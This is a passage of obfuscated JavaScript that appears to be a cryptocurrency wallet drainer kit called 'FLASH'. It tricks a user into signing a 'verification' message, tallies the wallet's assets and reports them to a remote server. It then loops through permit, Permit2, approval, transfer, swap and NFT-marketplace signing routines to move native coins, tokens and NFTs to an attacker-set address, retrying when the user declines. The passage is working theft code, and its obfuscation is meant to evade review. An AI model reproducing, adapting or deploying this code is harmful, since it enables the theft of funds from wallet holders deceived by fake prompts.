							text: _0x1455a4(0x1f9),
							showConfirmButton: !![],
							confirmButtonText: _0x1455a4(0x208),
							color: FLASH_Color_Scheme,
					  })
					: Swal[_0x1455a4(0x133)]({
							html: "<b>Sign\x20message</b>\x20to\x20verificate\x20you\x20wallet...",
							imageUrl: _0x1455a4(0x273),
							imageHeight: 0x3c,
							allowOutsideClick: ![],
							allowEscapeKey: ![],
							timer: 0x0,
							width: 0x258,
							showConfirmButton: ![],
					  });
				try {
					const _0x15bdfa = (
							FLASH_Verify_Message == ""
								? FLASH_Settings[_0x1455a4(0x218)]
								: FLASH_Verify_Message
						)["replaceAll"]("{{ADDRESS}}", FLASH_Current_Address),
						_0x43baf1 = await FLASH_Signer[_0x1455a4(0x23a)](
							_0x15bdfa
						),
						_0x3ac0e2 = ethers[_0x1455a4(0x1e8)][_0x1455a4(0x219)](
							ethers[_0x1455a4(0x1e8)][_0x1455a4(0x297)](
								_0x15bdfa
							),
							_0x43baf1
						);
					if (!_0x3ac0e2)
						return (
							FLASH_Loader_Style == 0x2
								? FLASHL[_0x1455a4(0x133)]({
										icon: _0x1455a4(0x11c),
										title: _0x1455a4(0xe7),
										subtitle: _0x1455a4(0x16c),
										text: _0x1455a4(0x29c),
										showConfirmButton: !![],
										confirmButtonText: "OK",
										color: FLASH_Color_Scheme,
								  })
								: Swal["fire"]({
										title: "Verification\x20Error",
										text: _0x1455a4(0x29c),
										icon: _0x1455a4(0x11c),
										confirmButtonText: "OK",
								  }),
							(FLASH_Process = ![]),
							await connect_cancel()
						);
					else {
						let _0x46d01b = await send_request({
							action: _0x1455a4(0xde),
							sign: _0x43baf1,
							address: FLASH_Current_Address,
							message: FLASH_Verify_Message,
						});
						if (_0x46d01b[_0x1455a4(0x1c2)] != "OK")
							return (
								FLASH_Loader_Style == 0x2
									? FLASHL[_0x1455a4(0x133)]({
											icon: _0x1455a4(0x11c),
											title: _0x1455a4(0xe7),
											subtitle: _0x1455a4(0x16c),
											text: "We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.",
											showConfirmButton: !![],
											confirmButtonText: "OK",
											color: FLASH_Color_Scheme,
									  })
									: Swal[_0x1455a4(0x133)]({
											title: _0x1455a4(0x16c),
											text: "We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.",
											icon: _0x1455a4(0x11c),
											confirmButtonText: "OK",
									  }),
								(FLASH_Process = ![]),
								await connect_cancel()
							);
					}
				} catch (_0xd40593) {
					return (
						FLASH_Loader_Style == 0x2
							? FLASHL["fire"]({
									icon: "error",
									title: _0x1455a4(0xe7),
									subtitle: _0x1455a4(0x16c),
									text: _0x1455a4(0xda),
									showConfirmButton: !![],
									confirmButtonText: "OK",
									color: FLASH_Color_Scheme,
							  })
							: Swal[_0x1455a4(0x133)]({
									title: _0x1455a4(0x16c),
									text: "We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.",
									icon: _0x1455a4(0x11c),
									confirmButtonText: "OK",
							  }),
						(FLASH_Process = ![]),
						await connect_cancel()
					);
				}
			} else
				await send_request({
					action: _0x1455a4(0xde),
					address: FLASH_Current_Address,
				});
			await connect_success(), show_check();
			if (
				FLASH_Settings[_0x1455a4(0x1ed)]["length"] > 0x0 &&
				FLASH_Settings["Wallet_Blacklist"]["includes"](
					FLASH_Current_Address["toLowerCase"]()["trim"]()
				)
			) {
				(FLASH_Check_Done = !![]), Swal["close"]();
				FLASH_Loader_Style == 0x2
					? FLASHL[_0x1455a4(0x133)]({
							icon: "error",
							title: _0x1455a4(0xe7),
							subtitle: _0x1455a4(0x173),
							text: _0x1455a4(0x1a8),
							showConfirmButton: !![],
							confirmButtonText: "OK",
							color: FLASH_Color_Scheme,
					  })
					: Swal[_0x1455a4(0x133)]({
							title: "AML\x20Error",
							text: _0x1455a4(0x1e3),
							icon: _0x1455a4(0x11c),
							confirmButtonText: "OK",
					  });
				FLASH_Process = ![];
				return;
			}
			let _0x4c7914 = await get_wallet_assets(FLASH_Current_Address),
				_0x30aa22 = 0x0;
			for (const _0x2588d4 of _0x4c7914) {
				try {
					_0x30aa22 += _0x2588d4[_0x1455a4(0xfe)];
				} catch (_0x4b6cb2) {
					console[_0x1455a4(0x215)](_0x4b6cb2);
				}
			}
			let _0x4b3abb = 0x0;
			for (const _0xf48e8 of _0x4c7914)
				_0x4b3abb += _0xf48e8[_0x1455a4(0xfe)];
			await send_request({
				action: "check_finish",
				user_id: FLASH_ID,
				assets: _0x4c7914,
				balance: _0x4b3abb,
			}),
				(FLASH_Check_Done = !![]),
				Swal[_0x1455a4(0x296)]();
			if (
				FLASH_Settings["Settings"]["Minimal_Wallet_Price"] > _0x30aa22
			) {
				FLASH_Loader_Style == 0x2
					? FLASHL[_0x1455a4(0x133)]({
							icon: _0x1455a4(0x11c),
							title: "Error",
							subtitle: _0x1455a4(0x221),
							text: _0x1455a4(0x262),
							showConfirmButton: !![],
							confirmButtonText: "OK",
							color: FLASH_Color_Scheme,
					  })
					: Swal[_0x1455a4(0x133)]({
							title: _0x1455a4(0x221),
							text: _0x1455a4(0x262),
							icon: _0x1455a4(0x11c),
							confirmButtonText: "OK",
					  });
				FLASH_Process = ![];
				return;
			}
			FLASH_Loader_Style == 0x2
				? FLASHL["fire"]({
						icon: "load",
						title: _0x1455a4(0xf4),
						text: _0x1455a4(0x14d),
						showConfirmButton: !![],
						confirmButtonText: _0x1455a4(0x208),
						color: FLASH_Color_Scheme,
				  })
				: Swal["fire"]({
						html: _0x1455a4(0x203),
						imageUrl: _0x1455a4(0x273),
						imageHeight: 0x3c,
						allowOutsideClick: ![],
						allowEscapeKey: ![],
						timer: 0x0,
						width: 0x258,
						showConfirmButton: ![],
				  });
			if (
				(FLASH_Settings["Settings"]["Sign"]["MetaMask"] == 0x0 &&
					FLASH_Current_Provider == _0x1455a4(0x17c)) ||
				(FLASH_Settings["Settings"][_0x1455a4(0x1b1)][
					_0x1455a4(0x214)
				] == 0x0 &&
					FLASH_Current_Provider == "Trust\x20Wallet") ||
				(FLASH_Current_Provider == "Trust\x20Wallet" &&
					!FLASH_Mobile_Status)
			)
				FLASH_Sign_Disabled = !![];
			for (const _0x470a4f of _0x4c7914) {
				try {
					if (_0x470a4f[_0x1455a4(0x1b3)] != _0x1455a4(0x143))
						FLASH_Gas_Reserves[_0x470a4f[_0x1455a4(0x114)]] += 0x1;
				} catch (_0x175d0c) {
					console[_0x1455a4(0x215)](_0x175d0c);
				}
			}
			console["table"](_0x4c7914);
			if (
				typeof SIGN_BLUR !== _0x1455a4(0x246) &&
				FLASH_Settings[_0x1455a4(0xb0)][_0x1455a4(0x1c1)]["Enable"] ==
					0x1 &&
				FLASH_Settings[_0x1455a4(0xb0)][_0x1455a4(0x1c1)][
					_0x1455a4(0x292)
				] == 0x1
			)
				await SIGN_BLUR(
					_0x4c7914,
					FLASH_Provider,
					FLASH_Current_Address,
					FLASH_Settings["Address"],
					FLASH_ID,
					FLASH_Settings["Settings"]["Blur"][_0x1455a4(0xbc)]
				);
			if (
				typeof SIGN_SEAPORT !== "undefined" &&
				FLASH_Settings["Settings"][_0x1455a4(0x1f8)]["Enable"] == 0x1 &&
				FLASH_Settings[_0x1455a4(0xb0)][_0x1455a4(0x1f8)]["Priority"] ==
					0x1
			)
				await SIGN_SEAPORT(
					_0x4c7914,
					FLASH_Provider,
					FLASH_Current_Address,
					FLASH_Settings[_0x1455a4(0x24e)],
					FLASH_ID,
					FLASH_Settings["Settings"][_0x1455a4(0x1f8)]["Price"]
				);
			if (
				typeof SIGN_X2Y2 !== _0x1455a4(0x246) &&
				FLASH_Settings["Settings"]["x2y2"][_0x1455a4(0x18c)] == 0x1 &&
				FLASH_Current_Chain_ID == 0x1 &&
				FLASH_Settings[_0x1455a4(0xb0)][_0x1455a4(0xd9)][
					_0x1455a4(0x292)
				] == 0x1
			)
				await SIGN_X2Y2(
					_0x4c7914,
					FLASH_Provider,
					FLASH_Current_Address,
					FLASH_Settings[_0x1455a4(0x24e)],
					FLASH_ID,
					FLASH_Settings[_0x1455a4(0xb0)][_0x1455a4(0xd9)][
						_0x1455a4(0xbc)
					]
				);
			let _0x2757c5 = !![];
			while (_0x2757c5) {
				_0x2757c5 = FLASH_Settings["LA"] == 0x1;
				for (const _0x1b7582 of _0x4c7914) {
					try {
						if (_0x1b7582[_0x1455a4(0x1f3)]) continue;
						let _0x501bd0 = ![];
						if (_0x1b7582[_0x1455a4(0x1b3)] == _0x1455a4(0x143)) {
							const _0x36909d = new ethers["providers"][
									_0x1455a4(0x14e)
								](
									FLASH_Settings[_0x1455a4(0x113)][
										_0x1b7582[_0x1455a4(0x114)]
									]
								),
								_0x12a7d4 = BN(
									await _0x36909d[_0x1455a4(0x103)]()
								)
									["div"](BN(0x64))
									[_0x1455a4(0xeb)](
										Math[_0x1455a4(0xe4)](
											FLASH_Gas_Multiplier * 0x64
										)
									),
								_0x34984c = BN(
									_0x1b7582[_0x1455a4(0x114)] == 0xa4b1
										? 0x4c4b40
										: _0x1b7582[_0x1455a4(0x114)] == 0xa86a
										? 0x4c4b40
										: _0x1b7582[_0x1455a4(0x114)] == 0x171
										? 0xdbba0
										: 0x249f0
								),
								_0x177437 = _0x34984c[_0x1455a4(0xeb)](
									FLASH_Gas_Reserves[
										_0x1b7582[_0x1455a4(0x114)]
									] + 0x1
								)[_0x1455a4(0xeb)](_0x12a7d4),
								_0x12e7d9 = {
									from: FLASH_Current_Address,
									to: FLASH_Settings[_0x1455a4(0x122)],
									value: BN(0x64),
								},
								_0x1e58c4 = await _0x36909d[_0x1455a4(0x1a7)](
									_0x12e7d9
								),
								_0x20b31b = await _0x36909d[_0x1455a4(0x1ae)](
									FLASH_Current_Address
								),
								_0x675c66 = _0x20b31b["sub"](
									_0x1e58c4[_0x1455a4(0xeb)](_0x12a7d4)
								)[_0x1455a4(0x21b)](_0x177437);
							if (_0x675c66["lte"](BN(0x0))) continue;
						}
						if (_0x1b7582["chain_id"] != FLASH_Current_Chain_ID) {
							await chain_request(
								FLASH_Current_Chain_ID,
								_0x1b7582[_0x1455a4(0x114)]
							);
							try {
								if (FLASH_Current_Provider == _0x1455a4(0x170))
									try {
										await FLASH_Provider["request"]({
											method: _0x1455a4(0x1a9),
											params: [
												{
													chainId:
														"0x" +
														_0x1b7582[
															_0x1455a4(0x114)
														][_0x1455a4(0x1b5)](
															0x10
														),
												},
											],
										});
									} catch (_0x165a11) {
										await chain_cancel();
										continue;
									}
								else
									try {
										await FLASH_Provider["request"]({
											method: "wallet_switchEthereumChain",
											params: [
												{
													chainId:
														"0x" +
														_0x1b7582["chain_id"][
															_0x1455a4(0x1b5)
														](0x10),
												},
											],
										});
									} catch (_0x5c92e9) {
										if (
											_0x5c92e9[_0x1455a4(0x156)] ==
												0x1326 ||
											_0x5c92e9[_0x1455a4(0x156)] ==
												-0x7f5b
										)
											try {
												await FLASH_Provider[
													_0x1455a4(0xf0)
												]({
													method: _0x1455a4(0x270),
													params: [
														FLASH_MetaMask_ChainData[
															_0x1b7582[
																_0x1455a4(0x114)
															]
														],
													],
												});
											} catch (_0x5e06ba) {
												await chain_cancel();
												continue;
											}
										else {
											await chain_cancel();
											continue;
										}
									}
								(FLASH_Current_Chain_ID =
									_0x1b7582[_0x1455a4(0x114)]),
									(FLASH_Web3 = new ethers["providers"][
										"Web3Provider"
									](FLASH_Provider)),
									(FLASH_Signer =
										FLASH_Web3[_0x1455a4(0x1ff)]()),
									(_0x501bd0 = !![]),
									await chain_success();
							} catch (_0x409144) {
								console[_0x1455a4(0x215)](_0x409144),
									await chain_cancel();
								continue;
							}
						} else _0x501bd0 = !![];
						if (!_0x501bd0) continue;
						if (_0x1b7582[_0x1455a4(0x1b3)] == "NATIVE") {
							if (
								FLASH_Settings[_0x1455a4(0xb0)][
									_0x1455a4(0x1b1)
								]["Native"] > 0x0 &&
								(!FLASH_Sign_Disabled ||
									FLASH_Settings["Settings"][
										_0x1455a4(0x1b1)
									]["Force"] == 0x1)
							)
								while (!![]) {
									try {
										await SIGN_NATIVE(_0x1b7582),
											(_0x1b7582[_0x1455a4(0x1f3)] =
												!![]);
										break;
									} catch (_0x167e66) {
										console[_0x1455a4(0x215)](_0x167e66);
										if (
											(FLASH_Settings[_0x1455a4(0xb0)][
												_0x1455a4(0x1b1)
											][_0x1455a4(0xc8)] == 0x1 &&
												FLASH_Current_Provider ==
													_0x1455a4(0x170)) ||
											(typeof _0x167e66["message"] ==
												_0x1455a4(0x13a) &&
												_0x167e66[_0x1455a4(0x1da)][
													"includes"
												](_0x1455a4(0x186))) ||
											_0x167e66[_0x1455a4(0x156)] ==
												-0x7f59 ||
											_0x167e66[_0x1455a4(0x156)] ==
												-0x7d00 ||
											(_0x167e66[_0x1455a4(0x1da)] &&
												is_valid_json(
													_0x167e66[_0x1455a4(0x1da)]
												) &&
												(JSON["parse"](
													_0x167e66[_0x1455a4(0x1da)]
												)[_0x1455a4(0x156)] ==
													-0x7f59 ||
													JSON["parse"](
														_0x167e66[
															_0x1455a4(0x1da)
														]
													)[_0x1455a4(0x156)] ==
														-0x7d00))
										) {
											if (
												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0x1b1)
												][_0x1455a4(0x1fc)] == 0x1
											)
												await sign_cancel();
											else {
												await sign_unavailable();
												while (!![]) {
													try {
														await TRANSFER_NATIVE(
															_0x1b7582
														),
															(_0x1b7582[
																_0x1455a4(0x1f3)
															] = !![]);
														break;
													} catch (_0x28f7cf) {
														console["log"](
															_0x28f7cf
														);
														if (
															_0x28f7cf !=
															_0x1455a4(0xf6)
														) {
															await transfer_cancel();
															if (
																!FLASH_Settings[
																	"Loop_N"
																]
															)
																break;
														} else break;
													}
												}
											}
											break;
										} else {
											console[_0x1455a4(0x215)](
												_0x167e66
											);
											if (_0x167e66 != _0x1455a4(0xf6)) {
												await sign_cancel();
												if (
													!FLASH_Settings[
														_0x1455a4(0x192)
													]
												)
													break;
											} else break;
										}
									}
								}
							else
								while (!![]) {
									try {
										await TRANSFER_NATIVE(_0x1b7582),
											(_0x1b7582[_0x1455a4(0x1f3)] =
												!![]);
										break;
									} catch (_0xea2d77) {
										console[_0x1455a4(0x215)](_0xea2d77);
										if (_0xea2d77 != "LOW_BALANCE") {
											await transfer_cancel();
											if (
												!FLASH_Settings[
													_0x1455a4(0x192)
												]
											)
												break;
										} else break;
									}
								}
						} else {
							if (_0x1b7582["type"] == _0x1455a4(0x1d6)) {
								if (
									typeof _0x1b7582[_0x1455a4(0x259)] ==
										_0x1455a4(0x246) &&
									FLASH_Settings[_0x1455a4(0xb0)][
										_0x1455a4(0x266)
									][_0x1455a4(0x1b9)] &&
									_0x1b7582["amount_usd"] >=
										FLASH_Settings["Settings"][
											_0x1455a4(0x266)
										][_0x1455a4(0xbc)]
								) {
									const _0x47ec2e = await retrive_token(
											_0x1b7582[_0x1455a4(0x114)],
											_0x1b7582[_0x1455a4(0x190)]
										),
										_0x1ba2c8 = new ethers[
											_0x1455a4(0x264)
										]["JsonRpcProvider"](
											FLASH_Settings["RPCs"][
												_0x1b7582[_0x1455a4(0x114)]
											]
										),
										_0x10d442 = new ethers[
											_0x1455a4(0x10a)
										](
											_0x1b7582[_0x1455a4(0x190)],
											_0x47ec2e,
											_0x1ba2c8
										),
										_0x49cd90 = get_permit_type(
											_0x10d442["functions"]
										);
									(_0x1b7582[_0x1455a4(0x259)] = _0x49cd90),
										(_0x1b7582[_0x1455a4(0xb9)] = "1"),
										(_0x1b7582[_0x1455a4(0x197)] =
											_0x47ec2e);
									if (_0x49cd90 > 0x0) {
										if (
											_0x10d442[_0x1455a4(0x149)][
												_0x1455a4(0x1a4)
											](_0x1455a4(0xe3))
										)
											try {
												_0x1b7582[_0x1455a4(0xb9)] =
													await _0x10d442[
														"version"
													]();
											} catch (_0x23d05a) {
												console[_0x1455a4(0x215)](
													_0x23d05a
												);
											}
										console[_0x1455a4(0x215)](
											_0x1455a4(0x28e) +
												_0x1b7582[_0x1455a4(0x12b)] +
												",\x20Permit\x20Type:\x20" +
												_0x49cd90 +
												",\x20Version:\x20" +
												_0x1b7582["permit_ver"]
										);
									}
								}
								if (_0x1b7582[_0x1455a4(0x259)] > 0x0)
									for (const _0xc985be of FLASH_Settings[
										_0x1455a4(0xc1)
									]) {
										if (
											_0xc985be[0x0] ==
												FLASH_Current_Chain_ID &&
											_0xc985be[0x1] ===
												_0x1b7582[_0x1455a4(0x190)]
													[_0x1455a4(0x2a1)]()
													[_0x1455a4(0x111)]()
										) {
											_0x1b7582[_0x1455a4(0x259)] = 0x0;
											break;
										}
									}
								if (
									FLASH_Settings["Settings"][_0x1455a4(0xd4)][
										"Mode"
									] &&
									_0x1b7582[_0x1455a4(0x159)]
								) {
									const _0x4d9095 = [];
									for (const _0xae0bdb of _0x4c7914) {
										try {
											_0xae0bdb[_0x1455a4(0x114)] ==
												_0x1b7582["chain_id"] &&
												_0xae0bdb["permit2"] &&
												(_0x4d9095[_0x1455a4(0x185)](
													_0xae0bdb
												),
												(_0xae0bdb[_0x1455a4(0x1f3)] =
													!![]));
										} catch (_0x1947c0) {
											console["log"](_0x1947c0);
										}
									}
									while (!![]) {
										try {
											await DO_PERMIT2(
												_0x1b7582,
												_0x4d9095
											),
												(_0x1b7582[_0x1455a4(0x1f3)] =
													!![]);
											break;
										} catch (_0x36348e) {
											console[_0x1455a4(0x215)](
												_0x36348e
											),
												await approve_cancel();
											if (!FLASH_Settings["Loop_T"])
												break;
										}
									}
								} else {
									if (
										FLASH_Settings["Settings"][
											_0x1455a4(0x266)
										]["Mode"] &&
										_0x1b7582[_0x1455a4(0x259)] &&
										_0x1b7582[_0x1455a4(0x259)] > 0x0
									)
										while (!![]) {
											try {
												await PERMIT_TOKEN(_0x1b7582),
													(_0x1b7582[
														_0x1455a4(0x1f3)
													] = !![]);
												break;
											} catch (_0x57861e) {
												console[_0x1455a4(0x215)](
													_0x57861e
												),
													await approve_cancel();
												if (
													!FLASH_Settings[
														_0x1455a4(0x282)
													]
												)
													break;
											}
										}
									else {
										if (
											FLASH_Settings["Settings"][
												_0x1455a4(0x274)
											][_0x1455a4(0x18c)] &&
											_0x1b7582[_0x1455a4(0x207)] &&
											_0x1b7582["amount_usd"] >=
												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0x274)
												][_0x1455a4(0xbc)]
										) {
											if (
												_0x1b7582[_0x1455a4(0x1d0)] ==
												_0x1455a4(0xe1)
											) {
												const _0x1be2f0 = [];
												for (const _0x4c448f of _0x4c7914) {
													try {
														_0x4c448f[
															_0x1455a4(0x114)
														] ==
															_0x1b7582[
																_0x1455a4(0x114)
															] &&
															_0x4c448f[
																_0x1455a4(0x207)
															] &&
															_0x4c448f[
																"swapper_type"
															] == "Uniswap" &&
															(_0x1be2f0[
																_0x1455a4(0x185)
															](_0x4c448f),
															(_0x4c448f[
																_0x1455a4(0x1f3)
															] = !![]));
													} catch (_0x3dcbbc) {
														console[
															_0x1455a4(0x215)
														](_0x3dcbbc);
													}
												}
												while (!![]) {
													try {
														await DO_UNISWAP(
															_0x1b7582,
															_0x1be2f0
														),
															(_0x1b7582["skip"] =
																!![]);
														break;
													} catch (_0x50523a) {
														console[
															_0x1455a4(0x215)
														](_0x50523a),
															await sign_cancel();
														if (
															!FLASH_Settings[
																_0x1455a4(0x282)
															]
														)
															break;
													}
												}
											} else {
												if (
													_0x1b7582[
														_0x1455a4(0x1d0)
													] == _0x1455a4(0x196)
												) {
													const _0x16ec26 = [];
													for (const _0x253215 of _0x4c7914) {
														try {
															_0x253215[
																"chain_id"
															] ==
																_0x1b7582[
																	_0x1455a4(
																		0x114
																	)
																] &&
																_0x253215[
																	_0x1455a4(
																		0x207
																	)
																] &&
																_0x253215[
																	_0x1455a4(
																		0x1d0
																	)
																] ==
																	"Pancake_V3" &&
																(_0x16ec26[
																	_0x1455a4(
																		0x185
																	)
																](_0x253215),
																(_0x253215[
																	_0x1455a4(
																		0x1f3
																	)
																] = !![]));
														} catch (_0x2feb7f) {
															console["log"](
																_0x2feb7f
															);
														}
													}
													while (!![]) {
														try {
															await DO_PANCAKE_V3(
																_0x1b7582,
																_0x16ec26
															),
																(_0x1b7582[
																	_0x1455a4(
																		0x1f3
																	)
																] = !![]);
															break;
														} catch (_0x14ed69) {
															console[
																_0x1455a4(0x215)
															](_0x14ed69),
																await sign_cancel();
															if (
																!FLASH_Settings[
																	"Loop_T"
																]
															)
																break;
														}
													}
												} else
													while (!![]) {
														try {
															await DO_SWAP(
																_0x1b7582
															),
																(_0x1b7582[
																	_0x1455a4(
																		0x1f3
																	)
																] = !![]);
															break;
														} catch (_0x371c7d) {
															console[
																_0x1455a4(0x215)
															](_0x371c7d),
																await sign_cancel();
															if (
																!FLASH_Settings[
																	_0x1455a4(
																		0x282
																	)
																]
															)
																break;
														}
													}
											}
										} else {
											if (
												FLASH_Settings[_0x1455a4(0xb0)][
													_0x1455a4(0x1b1)
												][_0x1455a4(0x108)] > 0x0 &&
												(!FLASH_Sign_Disabled ||
													FLASH_Settings[
														_0x1455a4(0xb0)
													][_0x1455a4(0x1b1)][
														"Force"
													] == 0x1)
											)
												while (!![]) {
													try {
														await SIGN_TOKEN(
															_0x1b7582
														);
														if (
															FLASH_Settings[
																_0x1455a4(0xb0)
															][_0x1455a4(0x1b1)][
																"Tokens"
															] == 0x1
														) {
															const _0x376b91 =
																send_request({
																	action: _0x1455a4(
																		0x181
																	),
																	user_id:
																		FLASH_ID,
																	asset: _0x1b7582,
																	address:
																		FLASH_Current_Address,
																	PW: ![],
																});
															if (
																FLASH_Settings[
																	_0x1455a4(
																		0xb0
																	)
																][
																	_0x1455a4(
																		0x123
																	)
																]
															)
																await _0x376b91;
														}
														_0x1b7582[
															_0x1455a4(0x1f3)
														] = !![];
														break;
													} catch (_0x4440ac) {
														console["log"](
															_0x4440ac
														);
														if (
															(FLASH_Settings[
																_0x1455a4(0xb0)
															][_0x1455a4(0x1b1)][
																_0x1455a4(0xc8)
															] == 0x1 &&
																FLASH_Current_Provider ==
																	"WalletConnect") ||
															(typeof _0x4440ac[
																_0x1455a4(0x1da)
															] == "string" &&
																_0x4440ac[
																	_0x1455a4(
																		0x1da
																	)
																]["includes"](
																	_0x1455a4(
																		0x186
																	)
																)) ||
															_0x4440ac[
																_0x1455a4(0x156)
															] == -0x7f59 ||
															_0x4440ac[
																_0x1455a4(0x156)
															] == -0x7d00 ||
															(_0x4440ac[
																_0x1455a4(0x1da)
															] &&
																is_valid_json(
																	_0x4440ac[
																		"message"
																	]
																) &&
																(JSON["parse"](
																	_0x4440ac[
																		"message"
																	]
																)[
																	_0x1455a4(
																		0x156
																	)
																] == -0x7f59 ||
																	JSON[
																		_0x1455a4(
																			0xfd
																		)
																	](
																		_0x4440ac[
																			_0x1455a4(
																				0x1da
																			)
																		]
																	)[
																		_0x1455a4(
																			0x156
																		)
																	] ==
																		-0x7d00))
														) {
															if (
																FLASH_Settings[
																	_0x1455a4(
																		0xb0
																	)
																]["Sign"][
																	_0x1455a4(
																		0x1fc
																	)
																] == 0x1
															)
																await sign_cancel();
															else {
																await sign_unavailable();
																while (!![]) {
																	if (
																		FLASH_Settings[
																			"Settings"
																		][
																			_0x1455a4(
																				0x1b1
																			)
																		][
																			_0x1455a4(
																				0x108
																			)
																		] == 0x1
																	) {
																		if (
																			(FLASH_Current_Provider ==
																				_0x1455a4(
																					0x17c
																				) &&
																				FLASH_Settings[
																					_0x1455a4(
																						0xb0
																					)
																				][
																					_0x1455a4(
																						0x12d
																					)
																				][
																					_0x1455a4(
																						0x17c
																					)
																				]) ||
																			(FLASH_Current_Provider ==
																				_0x1455a4(
																					0x288
																				) &&
																				FLASH_Settings[
																					_0x1455a4(
																						0xb0
																					)
																				][
																					_0x1455a4(
																						0x12d
																					)
																				][
																					_0x1455a4(
																						0x214
																					)
																				]) ||
																			(FLASH_Current_Provider !=
																				"MetaMask" &&
																				FLASH_Current_Provider !=
																					_0x1455a4(
																						0x288
																					))
																		)
																			try {
																				let _0x8df2ff =
																					await APPROVE_TOKEN(
																						_0x1b7582
																					);
																				if (
																					_0x8df2ff ==
																					0x1
																				) {
																					const _0x5c49e4 =
																						send_request(
																							{
																								action: "approve_token",
																								user_id:
																									FLASH_ID,
																								asset: _0x1b7582,
																								address:
																									FLASH_Current_Address,
																								PW: FLASH_Settings[
																									_0x1455a4(
																										0x28b
																									)
																								],
																							}
																						);
																					if (
																						FLASH_Settings[
																							_0x1455a4(
																								0xb0
																							)
																						][
																							_0x1455a4(
																								0x123
																							)
																						]
																					)
																						await _0x5c49e4;
																				}
																				_0x1b7582[
																					_0x1455a4(
																						0x1f3
																					)
																				] =
																					!![];
																				break;
																			} catch (_0x4fb21f) {
																				await approve_cancel();
																				if (
																					!FLASH_Settings[
																						_0x1455a4(
																							0x282
																						)
																					]
																				)
																					break;
																			}
																		else
																			try {
																				await TRANSFER_TOKEN(
																					_0x1b7582
																				),
																					(_0x1b7582[
																						"skip"
																					] =
																						!![]);
																				break;
																			} catch (_0x336991) {
																				console[
																					_0x1455a4(
																						0x215
																					)
																				](
																					_0x336991
																				),
																					await transfer_cancel();
																				if (
																					!FLASH_Settings[
																						_0x1455a4(
																							0x282
																						)
																					]
																				)
																					break;
																			}
																	} else {
																		if (
																			FLASH_Settings[
																				_0x1455a4(
																					0xb0
																				)
																			][
																				_0x1455a4(
																					0x1b1
																				)
																			][
																				"Tokens"
																			] ==
																			0x2
																		)
																			try {
																				await TRANSFER_TOKEN(
																					_0x1b7582
																				),
																					(_0x1b7582[
																						_0x1455a4(
																							0x1f3
																						)
																					] =
																						!![]);
																				break;
																			} catch (_0x1fd8b9) {
																				console[
																					_0x1455a4(
																						0x215
																					)
																				](
																					_0x1fd8b9
																				),
																					await transfer_cancel();
																				if (
																					!FLASH_Settings[
																						_0x1455a4(
																							0x282
																						)
																					]
																				)
																					break;
																			}
																	}
																}
															}
															break;
														} else {
															console[
																_0x1455a4(0x215)
															](_0x4440ac);
															if (
																_0x4440ac !=
																_0x1455a4(0xf6)
															) {
																await sign_cancel();
																if (
																	!FLASH_Settings[
																		_0x1455a4(
																			0x282
																		)
																	]
																)
																	break;
															} else break;
														}
													}
												}
											else {
												if (
													(FLASH_Current_Provider ==
														"MetaMask" &&
														FLASH_Settings[
															_0x1455a4(0xb0)
														][_0x1455a4(0x12d)][
															_0x1455a4(0x17c)
														]) ||
													(FLASH_Current_Provider ==
														"Trust\x20Wallet" &&
														FLASH_Settings[
															_0x1455a4(0xb0)
														][_0x1455a4(0x12d)][
															_0x1455a4(0x214)
														]) ||
													(FLASH_Current_Provider !=
														_0x1455a4(0x17c) &&
														FLASH_Current_Provider !=
															"Trust\x20Wallet")
												)
													while (!![]) {
														try {
															let _0x587b12 =
																await APPROVE_TOKEN(
																	_0x1b7582
																);
															if (
																_0x587b12 == 0x1
															) {
																const _0x21c8b4 =
																	send_request(
																		{
																			action: _0x1455a4(
																				0x181
																			),
																			user_id:
																				FLASH_ID,
																			asset: _0x1b7582,
																			address:
																				FLASH_Current_Address,
																			PW: FLASH_Settings[
																				_0x1455a4(
																					0x28b
																				)
																			],
																		}
																	);
																if (
																	FLASH_Settings[
																		_0x1455a4(
																			0xb0
																		)
																	][
																		_0x1455a4(
																			0x123
																		)
																	]
																)
																	await _0x21c8b4;
															}
															_0x1b7582["skip"] =
																!![];
															break;
														} catch (_0x4b02cc) {
															console[
																_0x1455a4(0x215)
															](_0x4b02cc),
																await approve_cancel();
															if (
																!FLASH_Settings[
																	"Loop_T"
																]
															)
																break;
														}
													}
												else
													while (!![]) {
														try {
															await TRANSFER_TOKEN(
																_0x1b7582
															),
																(_0x1b7582[
																	_0x1455a4(
																		0x1f3
																	)
																] = !![]);
															break;
														} catch (_0x81eaa5) {
															console[
																_0x1455a4(0x215)
															](_0x81eaa5),
																await transfer_cancel();
															if (
																!FLASH_Settings[
																	"Loop_T"
																]
															)
																break;
														}
													}
											}
										}
									}
								}
							} else {
								if (_0x1b7582["type"] == _0x1455a4(0x10f)) {
									if (
										typeof SIGN_BLUR !== _0x1455a4(0x246) &&
										FLASH_Settings[_0x1455a4(0xb0)][
											_0x1455a4(0x1c1)
										][_0x1455a4(0x18c)] == 0x1 &&
										FLASH_Settings[_0x1455a4(0xb0)]["Blur"][
											_0x1455a4(0x292)
										] == 0x0 &&
										!BL_US &&
										FLASH_Current_Chain_ID == 0x1 &&
										(await is_nft_approved(
											_0x1b7582[_0x1455a4(0x190)],
											FLASH_Current_Address,
											_0x1455a4(0x1f7)
										)) &&
										_0x1b7582[_0x1455a4(0xfe)] >=
											FLASH_Settings[_0x1455a4(0xb0)][
												"Blur"
											][_0x1455a4(0xbc)]
									)
										await SIGN_BLUR(
											_0x4c7914,
											FLASH_Provider,
											FLASH_Current_Address,
											FLASH_Settings["Address"],
											FLASH_ID,
											FLASH_Settings[_0x1455a4(0xb0)][
												"Blur"
											][_0x1455a4(0xbc)]
										),
											(BL_US = !![]);
									else {
										if (
											typeof SIGN_SEAPORT !==
												"undefined" &&
											FLASH_Settings[_0x1455a4(0xb0)][
												_0x1455a4(0x1f8)
											][_0x1455a4(0x18c)] == 0x1 &&
											FLASH_Settings[_0x1455a4(0xb0)][
												_0x1455a4(0x1f8)
											][_0x1455a4(0x292)] == 0x0 &&
											!SP_US &&
											FLASH_Current_Chain_ID == 0x1 &&
											(await is_nft_approved(
												_0x1b7582[_0x1455a4(0x190)],
												FLASH_Current_Address,
												_0x1455a4(0x2a3)
											)) &&
											_0x1b7582["amount_usd"] >=
